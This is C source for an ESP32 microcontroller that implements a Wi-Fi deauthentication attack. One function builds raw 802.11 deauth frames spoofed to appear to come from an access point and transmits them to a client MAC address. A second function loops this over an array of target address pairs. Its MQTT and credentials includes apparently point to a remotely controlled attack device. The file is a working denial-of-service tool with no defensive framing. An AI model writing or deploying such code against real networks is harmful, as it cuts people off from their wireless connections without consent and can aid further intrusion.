#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "string.h"
#include "cJSON.h"
#include "mqtt.h"
#include "esp_sntp.h"
#include <time.h>
#include <sys/time.h>
#include "esp_system.h"
#include "lwip/ip_addr.h"
#include "freertos/event_groups.h"
#include "mqtt_client.h"
#include "credentials.h"
#include "events.h"
#include "rcvd_payload.h"

void send_deauth_frame(const uint8_t *ap_bssid, const uint8_t *client_mac) { 
    uint8_t frame[26];
    frame[0]  = 0xC0;  // Frame Control: type=mgmt, subtype=deauth
    frame[1]  = 0x00;
    frame[2]  = 0x00;  // Duration
    frame[3]  = 0x00;

    memcpy(&frame[4],  client_mac, 6);  // Addr 1: RA (destination)
    memcpy(&frame[10], ap_bssid,  6);   // Addr 2: TA (source = AP)
    memcpy(&frame[16], ap_bssid,  6);   // Addr 3: BSSID

    frame[22] = 0x00;  // Sequence / Fragment
    frame[23] = 0x00;
    frame[24] = 0x00;  // Reason code: 0 = unspecified
    frame[25] = 0x00;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
    if (err != ESP_OK) {
        ESP_LOGE("DEAUTH:", "tx failed: %s", esp_err_to_name(err));
    } else {
        ESP_LOGI("DEAUTH:", "deauth sent to %02x:%02x:%02x:%02x:%02x:%02x",
                 client_mac[0], client_mac[1], client_mac[2],
                 client_mac[3], client_mac[4], client_mac[5]);
    }
}

void DEAUTHENTICATE(void) {
    for (int i = 0; i < inject_array_count; i++) {
        mac_pair_t target = inject_array[i];
        send_deauth_frame(target.source_mac, target.dest_mac); 
    }
}